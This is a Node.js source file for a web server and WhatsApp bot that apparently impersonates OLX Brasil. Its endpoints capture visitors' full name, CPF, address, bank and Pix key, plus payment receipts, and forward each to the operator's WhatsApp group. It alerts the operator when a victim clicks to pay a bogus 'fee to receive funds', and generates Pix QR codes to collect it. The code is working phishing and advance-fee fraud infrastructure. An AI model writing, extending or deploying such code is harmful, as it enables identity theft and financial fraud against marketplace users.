// Variáveis globais
let conn = null;
let isConnected = false;
let qrCode = null;

// Inicialização do WhatsApp
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
// const fs = require("fs");

const config = require("./config.json");
let destinatario = null;

async function resolverDestinatarioGrupo(valor) {
  if (typeof valor !== "string" || !valor.trim()) {
    throw new Error("groupDestino não está configurado.");
  }

  const destino = valor.trim();
  if (destino.endsWith("@g.us")) return destino;

  let link;
  try {
    link = new URL(destino);
  } catch {
    throw new Error("groupDestino deve ser um ID de grupo ou link de convite.");
  }

  if (
    link.hostname !== "chat.whatsapp.com" ||
    !link.pathname.split("/").filter(Boolean)[0]
  ) {
    throw new Error("O link groupDestino não é um convite válido do WhatsApp.");
  }

  const codigoConvite = link.pathname.split("/").filter(Boolean)[0];
  const grupo = await conn.groupGetInviteInfo(codigoConvite);
  if (!grupo.id?.endsWith("@g.us")) {
    throw new Error("Não foi possível obter o ID do grupo pelo link informado.");
  }

  return grupo.id;
}

// ---- Conexão por QR Code ou por número de telefone (pairing code) ----

// Mantém a escolha do método entre reconexões para não perguntar de novo.
let metodoConexaoCache = null;

// Normaliza um número para o formato exigido pelo pareamento: apenas dígitos,
// com código do país e DDD (ex.: 5521964562756). Remove "+", espaços e o
// sufixo "@s.whatsapp.net" caso venha de uma configuração existente.
function normalizarNumeroPareamento(valor) {
  if (!valor) return null;
  const digitos = String(valor).split("@")[0].replace(/\D/g, "");
  return digitos.length >= 10 ? digitos : null;
}

// Procura um número de pareamento informado por linha de comando, variável de
// ambiente ou configuração. Retorna null quando nada foi informado.
function obterNumeroPareamentoPreset() {
  const argv = process.argv.slice(2);
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    const comIgual = arg.match(/^--(?:pair|numero|number)=(.+)$/);
    if (comIgual) return normalizarNumeroPareamento(comIgual[1]);
    if (["--pair", "--numero", "--number"].includes(arg)) {
      return normalizarNumeroPareamento(argv[i + 1]);
    }
  }
  const env =
    process.env.PAIR_NUMBER ||
    process.env.NUMERO_PAREAMENTO ||
    process.env.WHATSAPP_NUMBER;
  if (env) return normalizarNumeroPareamento(env);
  if (config.pairNumber) return normalizarNumeroPareamento(config.pairNumber);
  return null;
}

// Decide como conectar quando ainda não há sessão: QR Code ou número de
// telefone. Prioriza um número já informado (CLI/env/config); caso contrário,
// pergunta no terminal. Em ambiente sem entrada (stdin fechado / sem teclado)
// ou após o tempo limite, cai para o QR Code — sem travar o processo.
//
// Usa uma ÚNICA interface readline para todo o diálogo: criar uma nova a cada
// pergunta faria o Node consumir (read-ahead) as linhas seguintes do stdin
// quando a entrada é um pipe (ex.: Git Bash / npm start no Windows), perdendo
// a resposta do número.
function resolverMetodoConexao(timeoutMs = 120000) {
  if (metodoConexaoCache) return Promise.resolve(metodoConexaoCache);

  const numeroPreset = obterNumeroPareamentoPreset();
  if (numeroPreset) {
    metodoConexaoCache = { metodo: "pair", numero: numeroPreset };
    return Promise.resolve(metodoConexaoCache);
  }

  const readline = require("readline");
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  return new Promise((resolve) => {
    let encerrado = false;
    let fechado = false;
    const linhas = []; // linhas recebidas ainda não consumidas
    let aguardando = null; // resolve() da pergunta em aberto

    // Entrega uma linha à pergunta pendente; se o stdin fechou (EOF), responde
    // null para não travar. Enfileirar as linhas evita perder a 2ª resposta
    // quando a entrada vem em bloco (pipe), onde o readline faz read-ahead.
    const entregar = () => {
      if (!aguardando) return;
      if (linhas.length) {
        const fn = aguardando;
        aguardando = null;
        fn(linhas.shift());
      } else if (fechado) {
        const fn = aguardando;
        aguardando = null;
        fn(null);
      }
    };

    const finalizar = (resultado) => {
      if (encerrado) return;
      encerrado = true;
      clearTimeout(timer);
      rl.close();
      metodoConexaoCache = resultado;
      resolve(resultado);
    };

    // Sem terminal interativo o stdin emite "close" (EOF) → QR Code.
    const timer = setTimeout(() => finalizar({ metodo: "qr" }), timeoutMs);
    rl.on("line", (l) => {
      linhas.push((l || "").trim());
      entregar();
    });
    rl.once("close", () => {
      fechado = true;
      entregar();
      finalizar({ metodo: "qr" });
    });

    const pergunta = (texto) => {
      if (texto) process.stdout.write(texto);
      return new Promise((res) => {
        aguardando = (v) => res(v == null ? null : String(v).trim());
        entregar();
      });
    };

    (async () => {
      console.log("\n==============================================");
      console.log(" Como deseja conectar o WhatsApp?");
      console.log("   1) QR Code (padrão)");
      console.log("   2) Número de telefone (código de pareamento)");
      console.log("==============================================");
      const escolha = await pergunta("Opção [1/2]: ");
      if (encerrado) return;

      if (escolha === "2") {
        const sugestao = normalizarNumeroPareamento(config.numerodobot);
        const texto = sugestao
          ? `Número com DDI+DDD (ex.: ${sugestao}) [Enter usa ${sugestao}]: `
          : "Número com DDI+DDD (ex.: 5521964562756): ";
        let numero = normalizarNumeroPareamento(await pergunta(texto));
        if (encerrado) return;
        if (!numero) numero = sugestao;
        if (numero) return finalizar({ metodo: "pair", numero });
        console.log("Número inválido. Usando QR Code.");
      }

      finalizar({ metodo: "qr" });
    })();
  });
}

async function connectToWhatsApp() {
  try {
    // Pasta da sessão do WhatsApp (caminho absoluto, igual ao usado na limpeza).
    const authDir = path.join(__dirname, "bot", "auth_info_baileys");

    // Já existe uma sessão salva? Nesse caso NÃO perguntamos nada: apenas
    // reconectamos. O menu só aparece quando não há sessão (primeira conexão
    // ou após a sessão ter sido invalidada/removida). Verificamos pelo arquivo
    // creds.json porque o flag state.creds.registered nem sempre é confiável
    // entre reinícios.
    const temSessao = fs.existsSync(path.join(authDir, "creds.json"));

    // Usar armazenamento de autenticação em múltiplos arquivos
    const { state, saveCreds } = await useMultiFileAuthState(authDir);

    // Define o método de conexão (QR ou número) apenas quando não há sessão.
    let metodoConexao = { metodo: "qr" };
    if (!temSessao && !state.creds.registered) {
      metodoConexao = await resolverMetodoConexao();
    } else {
      console.log("Sessão existente encontrada. Reconectando ao WhatsApp...");
    }
    const usarPareamento =
      metodoConexao.metodo === "pair" && !!metodoConexao.numero;
    let codigoPareamentoSolicitado = false;

    // Criar socket do WhatsApp
    const { version } = await fetchLatestBaileysVersion();
    console.log("baileys version", version);

    conn = makeWASocket({
      auth: state,
      version,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
    });

    // Escutar mensagens recebidas (para futuras implementações)
    const dataVendas = JSON.parse(
      fs.readFileSync(path.join(__dirname, "data", "vendas.json"))
    );

    conn.ev.on("messages.upsert", async (m) => {
      try {
        if (!m.messages) return;
        const mek = m.messages[0];
        if (!mek.message) return;
        if (mek.key.fromMe) return;
        if (mek.key && mek.key.remoteJid === "status@broadcast") return;

        // console.log("Mensagem recebida:", mek);
        require("./bot/system/admins")(conn, mek, dataVendas);
      } catch (error) {
        console.error("Erro ao processar mensagem:", error);
      }
    });

    // Quando a conexão for atualizada

    // Salvar credenciais quando autenticado
    conn.ev.on("creds.update", () => saveCreds());

    conn.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect, qr } = update;

      // O evento "qr" sinaliza que o servidor está pronto para parear. Nesse
      // momento escolhemos entre mostrar o QR ou solicitar o código de
      // pareamento por número de telefone.
      if (qr) {
        if (usarPareamento) {
          if (!codigoPareamentoSolicitado) {
            codigoPareamentoSolicitado = true;
            try {
              const code = await conn.requestPairingCode(metodoConexao.numero);
              const formatado = code?.match(/.{1,4}/g)?.join("-") || code;
              console.log("\n==============================================");
              console.log(" Pareamento por número de telefone");
              console.log(` Número:  ${metodoConexao.numero}`);
              console.log(` Código:  ${formatado}`);
              console.log(
                " No celular: WhatsApp > Aparelhos conectados >"
              );
              console.log(
                "   Conectar um aparelho > Conectar com número de telefone"
              );
              console.log("==============================================\n");
            } catch (error) {
              console.error(
                "Erro ao solicitar código de pareamento:",
                error?.message || error
              );
              // Permite nova tentativa no próximo evento de QR.
              codigoPareamentoSolicitado = false;
            }
          }
        } else {
          // Exibe o QR manualmente
          const qrcode = require("qrcode-terminal");
          qrcode.generate(qr, { small: true });
        }
      }

      // Se conectado
      if (connection === "open") {
        isConnected = true;
        console.log("Conectado ao WhatsApp");
        void (async () => {
          try {
            destinatario = await resolverDestinatarioGrupo(config.groupDestino);
            console.log(`Grupo de destino resolvido: ${destinatario}`);
            await conn.sendMessage(destinatario, {
              text: "*Conexão estabelecida com sucesso!*",
            });
          } catch (error) {
            console.error("Erro ao resolver o grupo de destino:", error.message);
          }
        })();

        // const { exec } = require("child_process");
        // exec(
        //   "cd bot/auth_info_baileys && find . ! -name 'creds.json' -type f -exec rm -f {} +"
        // );
      }

      // Se desconectado
      if (connection === "close") {
        isConnected = false;
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const loggedOut = statusCode === DisconnectReason.loggedOut; // 401

        console.log(
          "Conexão fechada. status:",
          statusCode,
          "-",
          lastDisconnect?.error?.message || lastDisconnect?.error
        );

        if (loggedOut) {
          // Credenciais inválidas/expiradas (ex.: 401). Remove a sessão salva
          // para permitir um novo pareamento/QR na próxima tentativa — caso
          // contrário o bot fica preso tentando logar com uma sessão rejeitada.
          try {
            fs.rmSync(authDir, { recursive: true, force: true });
            console.log(
              "Sessão inválida removida. Reiniciando para novo pareamento/QR..."
            );
          } catch (e) {
            console.error("Falha ao limpar a sessão:", e.message);
          }
          // Permite escolher o método novamente e re-solicitar o código.
          metodoConexaoCache = null;
        }

        // Reconecta (com sessão limpa quando foi deslogado) após breve espera.
        setTimeout(() => {
          connectToWhatsApp().catch((e) =>
            console.error("Falha ao reconectar:", e?.message || e)
          );
        }, 3000);
      }
    });
  } catch (error) {
    console.error("Erro na conexão com WhatsApp:", error);
  }
}

 


// Conexão do Site:

const express = require("express");
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const multer = require("multer");
const { v4: uuidv4 } = require("uuid");

// Configurar armazenamento para uploads
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = path.join(__dirname, "uploads");
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const fileExt = path.extname(file.originalname);
    cb(null, `comprovante-${uuidv4()}${fileExt}`);
  },
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limite
  fileFilter: function (req, file, cb) {
    const allowedTypes = /jpeg|jpg|png|pdf/;
    const extname = allowedTypes.test(
      path.extname(file.originalname).toLowerCase(),
    );
    const mimetype = allowedTypes.test(file.mimetype);

    if (extname && mimetype) {
      return cb(null, true);
    }
    cb(
      new Error("Apenas arquivos de imagem (JPEG, PNG) ou PDF são permitidos!"),
    );
  },
});

const app = express();
const PORT = process.env.PORT || 4000;

// Middleware para logs de requisições
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Middleware para processar dados de formulário e JSON
app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: "10mb" }));

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, "public")));
app.use("/data", express.static(path.join(__dirname, "data")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

// Proxy de imagens remotas para evitar bloqueios de hotlink
app.get("/proxy-image", async (req, res) => {
  const imageUrl = req.query.url;
  if (!imageUrl || !/^https?:\/\//i.test(imageUrl)) {
    return res.status(400).send("URL inválida");
  }

  try {
    const response = await axios.get(imageUrl, {
      responseType: "arraybuffer",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        Accept: "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        Referer: "https://www.olx.com.br/",
      },
      validateStatus: null,
    });

    if (response.status !== 200) {
      return res.status(response.status).send("Falha ao buscar imagem remota");
    }

    const contentType = response.headers["content-type"] || "image/jpeg";
    res.set("Content-Type", contentType);
    res.send(response.data);
  } catch (error) {
    console.error("Erro ao proxy de imagem:", error.message || error);
    res.status(502).send("Erro ao buscar imagem remota");
  }
});

// Função para verificar status do WhatsApp
function verificarStatusWhatsApp() {
  console.log(
    `Status da conexão WhatsApp: ${isConnected ? "Conectado" : "Desconectado"}`
  );
  return isConnected;
}

// Função melhorada para enviar mensagem WhatsApp
async function enviarMensagemWhatsApp(mensagem) {
  console.log("Iniciando envio de mensagem WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Tentando reconectar...");
      await connectToWhatsApp().catch((reconnectError) => {
        console.error("Falha ao tentar reconectar WhatsApp:", reconnectError);
      });

      // Pequeno atraso para dar tempo à conexão se estabilizar
      await new Promise((resolve) => setTimeout(resolve, 3000));

      if (!isConnected || !conn) {
        console.error("WhatsApp continua desconectado após tentativa de reconexão.");
        return {
          success: false,
          message: "WhatsApp não está conectado no momento. Tente novamente em alguns segundos.",
        };
      }
    }

    if (!destinatario) {
      return {
        success: false,
        message: "O grupo de destino ainda não foi resolvido. Verifique groupDestino.",
      };
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    console.log(`Tentando enviar mensagem para: ${destinatario}`);

    // Enviar a mensagem
    await conn.sendMessage(destinatario, { text: mensagem });
    console.log("Mensagem enviada com sucesso!");

    return { success: true, message: "Mensagem enviada com sucesso" };
  } catch (error) {
    console.error("Erro detalhado ao enviar mensagem:", error);
    return {
      success: false,
      message: `Erro ao enviar mensagem: ${error.message}`,
      error: error,
    };
  }
}

// Função para enviar arquivo pelo WhatsApp
async function enviarArquivoWhatsApp(filePath, caption) {
  console.log("Iniciando envio de arquivo WhatsApp...");

  try {
    // Verificar se está conectado
    if (!isConnected || !conn) {
      console.error("WhatsApp não está conectado. Status:", isConnected);
      return { success: false, message: "WhatsApp não está conectado" };
    }

    if (!destinatario) {
      return {
        success: false,
        message: "O grupo de destino ainda não foi resolvido. Verifique groupDestino.",
      };
    }

    // ID do grupo ou contato (pode ser alterado conforme necessário)
    // const destinatario = "120363397924256528@g.us"; // ID do grupo

    // Verificar se o arquivo existe
    if (!fs.existsSync(filePath)) {
      console.error(`Arquivo não encontrado: ${filePath}`);
      return { success: false, message: "Arquivo não encontrado" };
    }

    // Lê o arquivo para buffer
    const fileBuffer = fs.readFileSync(filePath);
    const fileExt = path.extname(filePath).toLowerCase();
    const fileName = path.basename(filePath);

    // Determinar o tipo de mídia com base na extensão
    let messageContent;
    if (fileExt === ".pdf") {
      messageContent = {
        document: fileBuffer,
        fileName: fileName,
        caption: caption,
      };
    } else {
      // para imagens (.jpg, .png, etc)
      messageContent = {
        image: fileBuffer,
        caption: caption,
      };
    }

    // Enviar o arquivo para o WhatsApp
    await conn.sendMessage(destinatario, messageContent);
    console.log("Arquivo enviado com sucesso!");

    return { success: true, message: "Arquivo enviado com sucesso" };
  } catch (error) {
    console.error("Erro ao enviar arquivo:", error);
    return {
      success: false,
      message: `Erro ao enviar arquivo: ${error.message}`,
      error: error,
    };
  }
}

// Endpoint para receber dados bancários e enviar para WhatsApp
app.post("/api/enviar-dados-bancarios", async (req, res) => {
  console.log("Recebendo requisição para enviar dados bancários");

  try {
    const dados = req.body;
    console.log("Dados recebidos no backend:", JSON.stringify(dados, null, 2));

    // Mapeando possíveis variações de nomes de campos vindos do frontend
    const nome = dados.nome;
    const email = dados.email;
    const telefone = dados.telefone;
    const cpf = dados.cpf;
    const banco = dados.banco;
    // Aceita tanto 'pix_tipo' quanto 'chave-pix-tipo'
    const pix_tipo = dados.pix_tipo || dados["chave-pix-tipo"];
    // Aceita tanto 'pix_chave' quanto 'chave-pix'
    const pix_chave = dados.pix_chave || dados["chave-pix"];
    
    const cep = dados.cep;
    const logradouro = dados.logradouro;
    const numero = dados.numero;
    const bairro = dados.bairro;
    const cidade = dados.cidade || dados.localidade;
    const estado = dados.estado || dados.uf;

    // Verificação detalhada indicando qual campo faltou (ótimo para debug no console)
    const camposFaltando = [];
    if (!nome) camposFaltando.push("nome");
    if (!email) camposFaltando.push("email");
    if (!telefone) camposFaltando.push("telefone");
    if (!cpf) camposFaltando.push("cpf");
    if (!banco) camposFaltando.push("banco");
    if (!pix_tipo) camposFaltando.push("pix_tipo (ou chave-pix-tipo)");
    if (!pix_chave) camposFaltando.push("pix_chave (ou chave-pix)");
    if (!cep) camposFaltando.push("cep");
    if (!logradouro) camposFaltando.push("logradouro");
    if (!numero) camposFaltando.push("numero");
    if (!bairro) camposFaltando.push("bairro");
    if (!cidade) camposFaltando.push("cidade");
    if (!estado) camposFaltando.push("estado");

    if (camposFaltando.length > 0) {
      console.error("Campos faltando ou vazios no req.body:", camposFaltando);
      return res.status(400).json({
        success: false,
        message: `Campos incompletos: ${camposFaltando.join(", ")}`,
      });
    }

    // Verificar status do WhatsApp antes de tentar enviar
    if (typeof verificarStatusWhatsApp === "function" && !verificarStatusWhatsApp()) {
      console.error("Tentativa de envio com WhatsApp desconectado");
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
      });
    }

    // Formatar mensagem com os dados validados
    const mensagem =
      `*Novos dados recebidos*\n\n` +
      `*ID da Venda:* ${dados.idProduto || 'Não informado'}\n\n` +
      `*Dados Pessoais:*\n` +
      `Nome: ${nome}\n` +
      `Email: ${email}\n` +
      `Telefone: ${telefone}\n` +
      `CPF: ${cpf}\n\n` +
      `*Endereço:*\n` +
      `CEP: ${cep}\n` +
      `Logradouro: ${logradouro}, ${numero}${dados.complemento ? ' (' + dados.complemento + ')' : ''}\n` +
      `Bairro: ${bairro}\n` +
      `Cidade/UF: ${cidade}/${estado}\n\n` +
      `*Dados Bancários:*\n` +
      `Banco: ${banco}\n` +
      `Tipo de Chave Pix: ${pix_tipo}\n` +
      `Chave Pix: ${pix_chave}\n\n` +
      `Enviado em: ${new Date().toLocaleString("pt-BR")}`;

    console.log("Mensagem formatada, iniciando envio...");

    // Enviar mensagem para o WhatsApp (garantindo compatibilidade caso a função espere parâmetro ou objeto)
    const resultado = await enviarMensagemWhatsApp(mensagem);
    console.log("Resultado do envio:", resultado);

    if (resultado && resultado.success) {
      return res.json({
        success: true,
        message: "Dados enviados com sucesso para o WhatsApp",
      });
    } else {
      return res.status(500).json({
        success: false,
        message: "Erro ao enviar mensagem para o WhatsApp",
        error: resultado ? resultado.message : "Erro desconhecido",
      });
    }
  } catch (error) {
    console.error("Erro ao processar dados bancários:", error);
    return res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Endpoint para obter dados da venda pelo ID
app.get("/api/venda/:id", (req, res) => {
  const id = req.params.id;

  // Carregar dados das vendas
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);

    // Buscar venda pelo ID
    const venda = vendas.find((v) => v.codigo === id);

    if (venda) {
      const vendaComPagamento = {
        ...venda,
        pagamento: venda.pagamento || "",
        pagamentoTipo: venda.pagamentoTipo || "texto",
      };

      setTimeout(() => {
        res.json(vendaComPagamento);
      }, 300);
    } else {
      res.status(404).json({
        error: "Venda não encontrada",
        message: "Não foi possível encontrar uma venda com o código informado.",
      });
    }
  } catch (error) {
    console.error("Erro ao buscar dados da venda:", error);
    res.status(500).json({
      error: "Erro ao processar requisição",
      message:
        "Ocorreu um erro ao processar sua solicitação. Tente novamente mais tarde.",
    });
  }
});

// Endpoint para compatibilidade com URLs que usam "pag" na rota
app.get("/pag", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Endpoint para acessar a página de dados bancários (usando .html em vez de .php)
app.get("/pag/dados.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "dados.html"));
});

// Endpoint para acessar a página de alerta
app.get("/pag/alerta.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para simular .php (para compatibilidade com o formato solicitado)
app.get("/pag/alerta.php", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "pag", "alerta.html"));
});

// Endpoint para buscar todas as vendas (útil para dashboard)
app.get("/api/vendas", (req, res) => {
  try {
    const vendasData = fs.readFileSync(
      path.join(__dirname, "data", "vendas.json"),
      "utf8"
    );
    const vendas = JSON.parse(vendasData);
    res.json(vendas);
  } catch (error) {
    console.error("Erro ao buscar todas as vendas:", error);
    res.status(500).json({ error: "Erro ao processar requisição" });
  }
});

// Endpoint para termos de uso (retorna um JSON simples)
app.get("/api/termos", (req, res) => {
  res.json({
    titulo: "Termos de Uso da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "Este documento apresenta os termos e condições gerais...",
  });
});

// Endpoint para política de privacidade (retorna um JSON simples)
app.get("/api/privacidade", (req, res) => {
  res.json({
    titulo: "Política de Privacidade da OLX Brasil",
    atualizado: "01/04/2023",
    conteudo: "A OLX Brasil está comprometida em proteger sua privacidade...",
  });
});

// Endpoint para receber comprovante e enviar via WhatsApp
app.post(
  "/api/enviar-comprovante",
  upload.single("comprovante"),
  async (req, res) => {
    console.log("Recebendo requisição para enviar comprovante");

    try {
      // Verificar se o arquivo foi recebido
      if (!req.file) {
        console.error("Nenhum arquivo recebido");
        return res.status(400).json({
          success: false,
          message: "Nenhum arquivo de comprovante recebido",
        });
      }

      console.log("Arquivo recebido:", req.file);

      // Verificar status do WhatsApp antes de tentar enviar
      if (!verificarStatusWhatsApp()) {
        console.error("Tentativa de envio com WhatsApp desconectado");
        return res.status(503).json({
          success: false,
          message:
            "Serviço do WhatsApp indisponível no momento. Tente novamente mais tarde.",
        });
      }

      // Extrair dados do formulário
      const chavePix = req.body.chavePix || "Não informada";
      const valor = req.body.valor || "Não informado";

      // Formatar mensagem para o comprovante
      const caption =
        `*COMPROVANTE DE PAGAMENTO RECEBIDO*\n\n` +
        `*Dados do Pagamento:*\n` +
        `Valor: R$ ${valor}\n` +
        `Chave PIX: ${chavePix}\n\n` +
        `Recebido em: ${new Date().toLocaleString("pt-BR")}`;

      // Enviar o arquivo pelo WhatsApp
      const resultado = await enviarArquivoWhatsApp(req.file.path, caption);

      if (resultado.success) {
        res.json({
          success: true,
          message: "Comprovante enviado com sucesso para o WhatsApp",
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Erro ao enviar comprovante para o WhatsApp",
          error: resultado.message,
        });
      }
    } catch (error) {
      console.error("Erro ao processar envio de comprovante:", error);
      res.status(500).json({
        success: false,
        message: "Erro ao processar sua solicitação",
        error: error.message,
      });
    }
  }
);

// Endpoint para notificar quando o cliente clica em "Continuar"
app.post("/api/notificar-clique-continuar", async (req, res) => {
  console.log("Cliente clicou em botão de ação");

  try {
    const dados = req.body;
    const codigoVenda = dados.codigo || "Não informado";
    const nomeProduto = dados.produto || "Não informado";
    const acao = dados.acao || "continuar";
    const valor = dados.valor || "";

    // Verificar status do WhatsApp antes de tentar enviar
    if (!verificarStatusWhatsApp()) {
      console.error(
        "WhatsApp desconectado - não foi possível enviar notificação de clique"
      );
      return res.status(503).json({
        success: false,
        message: "Serviço do WhatsApp indisponível",
      });
    }

    // Definir mensagem com base na ação
    let mensagem;

    if (acao === "clique_taxa") {
      mensagem =
        `*⚠️ CLIENTE VAI PAGAR A TAXA DE RECEBIMENTO DE VALORES ⚠️*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n` +
        `Valor da taxa: R$ ${valor}\n\n` +
        `Cliente clicou no botão para pagar a taxa de recebimento de valores e está sendo redirecionado para a página de pagamento.\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    } else {
      mensagem =
        `*Cliente clicou em CONTINUAR*\n\n` +
        `*Informações da venda:*\n` +
        `Código da venda: ${codigoVenda}\n` +
        `Produto: ${nomeProduto}\n\n` +
        `Cliente viu a mensagem de conclusão e clicou em continuar\n` +
        `Horário: ${new Date().toLocaleString("pt-BR")}`;
    }

    // Enviar mensagem para o WhatsApp
    const resultado = await enviarMensagemWhatsApp(mensagem);

    if (resultado.success) {
      res.json({
        success: true,
        message: "Notificação enviada com sucesso",
      });
    } else {
      res.status(500).json({
        success: false,
        message: "Erro ao enviar notificação para o WhatsApp",
        error: resultado.message,
      });
    }
  } catch (error) {
    console.error("Erro ao processar notificação de clique:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao processar sua solicitação",
      error: error.message,
    });
  }
});

// Importar o módulo qrcodepagamentos
const qrcodePagamentos = require('./js/qrcodepagamentos');

// Endpoint para gerar QR Code PIX
app.get("/api/gerar-qrcode-pix", async (req, res) => {
  try {
    console.log("Gerando QR Code PIX...");
    const resultado = await qrcodePagamentos.gerarQRCode();

    if (resultado?.status === 404 || resultado?.status === 401 || resultado?.status === 403 || resultado?.status === 500) {
      const mensagemErro = resultado?.error || "Erro ao gerar QR Code PIX";
      console.error("Falha ao gerar QR Code PIX:", mensagemErro);

      try {
        await enviarMensagemWhatsApp(
          `*⚠️ ERRO AO GERAR QR CODE PIX ⚠️*\n\n${mensagemErro}\n\nHorário: ${new Date().toLocaleString("pt-BR")}`,
        );
      } catch (notifyError) {
        console.error("Erro ao enviar notificação do WhatsApp:", notifyError);
      }

      return res.status(resultado?.status || 500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        error: mensagemErro,
      });
    }

    if (!resultado || !resultado.imgBase64) {
      console.error("Erro ao gerar QR Code PIX: Resultado inválido");
      return res.status(500).json({
        success: false,
        message: "Não foi possível gerar o QR Code PIX",
        resultado,
      });
    }

    res.json({
      success: true,
      qrCodeBase64: resultado.imgBase64,
      pixTitle: resultado.pixTitle,
    });
  } catch (error) {
    console.error("Erro ao gerar QR Code PIX:", error);
    res.status(500).json({
      success: false,
      message: "Erro ao gerar QR Code PIX",
      error: error.message,
    });
  }
});

// Rota padrão para qualquer outra solicitação (SPA pattern)
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Middleware para tratamento de erros
app.use((err, req, res, next) => {
  console.error("Erro na aplicação:", err);
  res
    .status(500)
    .send("Ocorreu um erro no servidor. Tente novamente mais tarde.");
});

app.listen(PORT, () => {
  console.log(`Servidor rodando na porta ${PORT}`);
  console.log(`Acesse: http://localhost:${PORT}/pag/?id=KFTKWNQVMD`);
  connectToWhatsApp();
});
